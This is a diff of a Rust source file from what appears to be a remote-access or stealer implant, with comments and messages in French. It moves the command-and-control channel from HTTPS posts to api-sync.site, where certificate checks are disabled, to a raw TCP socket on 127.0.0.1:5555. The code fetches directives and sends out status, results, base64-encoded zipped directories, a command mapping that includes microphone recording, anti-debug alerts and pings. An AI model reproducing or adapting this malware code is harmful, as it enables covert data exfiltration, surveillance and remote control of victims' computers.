@@ -1,27 +1,26 @@
 use anyhow::Result;
-use reqwest::Client;
-use reqwest::Error;
-use serde::Deserialize;
+use base64::engine::Engine;
 use serde::Serialize;
 use std::fs::File;
 use std::io::prelude::*;
 use std::io::Read;
 use std::path::Path;
+use std::sync::Arc;
+use tokio::io::AsyncWriteExt;
+use tokio::net::TcpStream;
+use tokio::sync::Mutex;
 use tempfile::NamedTempFile;
 use walkdir::WalkDir;
 use zip::result::ZipResult;
 use zip::write::SimpleFileOptions;
 use zip::{AesMode, CompressionMethod};
 
+const C2_ADDR: &str = "127.0.0.1";
+const C2_PORT: u16 = 5555;
+
 enum _Status {
     SUCCESSFUL,
     FAILED,
-}
-#[derive(Deserialize)]
-struct Directive {
-    // id: String,
-    command: String,
-    // status: String,
 }
 
 #[derive(Serialize)]
@@ -35,80 +34,73 @@ pub struct CommandMapping {
     pub mic_rec: String,
 }
 
+pub static TCP_SOCKET: once_cell::sync::Lazy<Arc<Mutex<Option<TcpStream>>>> =
+    once_cell::sync::Lazy::new(|| Arc::new(Mutex::new(None)));
+
+pub async fn connect_to_c2() -> Result<()> {
+    let addr = format!("{}:{}", C2_ADDR, C2_PORT);
+    match TcpStream::connect(&addr).await {
+        Ok(socket) => {
+            let mut socket_guard = TCP_SOCKET.lock().await;
+            *socket_guard = Some(socket);
+            println!("[+] Connecté au serveur C2: {}", addr);
+            Ok(())
+        }
+        Err(e) => {
+            Err(anyhow::anyhow!("Erreur connexion TCP: {}", e))
+        }
+    }
+}
+
+async fn send_data_tcp(data: &[u8]) -> Result<()> {
+    let mut socket_guard = TCP_SOCKET.lock().await;
+    
+    if let Some(socket) = &mut *socket_guard {
+        socket.write_all(data).await?;
+        Ok(())
+    } else {
+        Err(anyhow::anyhow!("Socket TCP non connectée"))
+    }
+}
+
+
+
 pub async fn send_directive_status(
     directive: &str,
     status: &str,
     message: &str,
-) -> Result<(), reqwest::Error> {
-    let client = reqwest::Client::builder()
-        .danger_accept_invalid_certs(true)
-        .build()?;
-
+) -> Result<(), Box<dyn std::error::Error>> {
     let body = serde_json::json!({
+        "type": "status",
         "directive": directive,
         "status": status,
         "message": message
     });
 
-    let res = client
-        .post("https://api-sync.site/sync")
-        .json(&body)
-        .send()
-        .await;
-
-    if let Err(e) = res {
-        eprintln!("Erreur lors de l'envoi du statut : {:?}", e);
-    }
-
+    let json_str = serde_json::to_string(&body)?;
+    send_data_tcp(json_str.as_bytes()).await?;
+    send_data_tcp(b"\n").await?;
+    
     Ok(())
-}
-
-pub async fn get_directives() -> Result<Vec<String>, Error> {
-    let url = "https://api-sync.site/directives";
-
-    let client = reqwest::Client::builder()
-        .danger_accept_invalid_certs(true)
-        .build()?;
-
-    let response = client.get(url).send().await?.error_for_status()?;
-
-    let directives: Vec<Directive> = response.json().await?;
-
-    let commands: Vec<String> = directives
-        .into_iter()
-        .map(|directive| directive.command)
-        .collect();
-
-    Ok(commands)
 }
 
 pub async fn send_json_to_c2<T: Serialize>(data: &T) -> Result<()> {
-    let client = reqwest::Client::builder()
-        .danger_accept_invalid_certs(true)
-        .build()?;
-
-    let _res = client
-        .post("https://api-sync.site/directives")
-        .header("Content-Type", "application/json")
-        .json(data)
-        .send()
-        .await?;
-
+    let json_str = serde_json::to_string(data)?;
+    send_data_tcp(json_str.as_bytes()).await?;
+    send_data_tcp(b"\n").await?;
     Ok(())
 }
 
-pub async fn send_to_c2(data: Vec<u8>) -> Result<(), Error> {
-    let client = reqwest::Client::builder()
-        .danger_accept_invalid_certs(true)
-        .build()?;
-
-    let _res = client
-        .post("https://api-sync.site/directives")
-        .header("Content-Type", "text/plain")
-        .body(data)
-        .send()
-        .await?;
-
+pub async fn send_to_c2(data: Vec<u8>) -> Result<(), Box<dyn std::error::Error>> {
+    let json = serde_json::json!({
+        "type": "result",
+        "data": String::from_utf8_lossy(&data)
+    });
+    
+    let json_str = serde_json::to_string(&json)?;
+    send_data_tcp(json_str.as_bytes()).await?;
+    send_data_tcp(b"\n").await?;
+    
     Ok(())
 }
 
@@ -169,39 +161,31 @@ pub async fn zip_dir(folder_path: &Path) -> ZipResult<NamedTempFile> {
 }
 
 pub async fn send_zip_to_c2(filepath: &Path) -> Result<(), Box<dyn std::error::Error>> {
-    let client = Client::builder()
-        .danger_accept_invalid_certs(true)
-        .build()?;
-
     let file_bytes = tokio::fs::read(filepath).await?;
-
-    let response = client
-        .post("https://api-sync.site/directives")
-        .header("Content-Type", "application/zip")
-        .body(file_bytes)
-        .send()
-        .await?;
-
-    println!("Status: {}", response.status());
+    
+    let json = serde_json::json!({
+        "type": "result",
+        "data": base64::engine::general_purpose::STANDARD.encode(&file_bytes),
+        "filename": filepath.file_name().unwrap_or_default().to_string_lossy()
+    });
+    
+    let json_str = serde_json::to_string(&json)?;
+    send_data_tcp(json_str.as_bytes()).await?;
+    send_data_tcp(b"\n").await?;
+    
     Ok(())
 }
 
-pub async fn send_mapping(mapping: &CommandMapping) -> Result<(), reqwest::Error> {
-    let client = reqwest::Client::builder()
-        .danger_accept_invalid_certs(true)
-        .build()?;
+pub async fn send_mapping(mapping: &CommandMapping) -> Result<(), Box<dyn std::error::Error>> {
+    let json = serde_json::json!({
+        "type": "mapping",
+        "data": mapping
+    });
 
-    let res = client
-        .post("https://api-sync.site/mapping")
-        .json(mapping)
-        .send()
-        .await;
-
-    if let Err(e) = res {
-        eprintln!("Erreur lors de l'envoi du mapping : {:?}", e);
-        return Err(e);
-    }
-
+    let json_str = serde_json::to_string(&json)?;
+    send_data_tcp(json_str.as_bytes()).await?;
+    send_data_tcp(b"\n").await?;
+    
     Ok(())
 }
 
@@ -209,16 +193,15 @@ pub async fn send_anti_debug_alert() {
     let _ = send_directive_status("anti_debug", "warning", "Debugger détecté").await;
 }
 
-pub async fn ping_c2() -> Result<(), Error> {
-    let client = reqwest::Client::builder()
-        .danger_accept_invalid_certs(true)
-        .build()?;
+pub async fn ping_c2() -> Result<(), Box<dyn std::error::Error>> {
+    let json = serde_json::json!({
+        "type": "ping",
+        "data": "alive"
+    });
 
-    let _res = client
-        .post("https://api-sync.site/directives")
-        .body("loadcapacity 37")
-        .send()
-        .await?;
-
+    let json_str = serde_json::to_string(&json)?;
+    send_data_tcp(json_str.as_bytes()).await?;
+    send_data_tcp(b"\n").await?;
+    
     Ok(())
 }
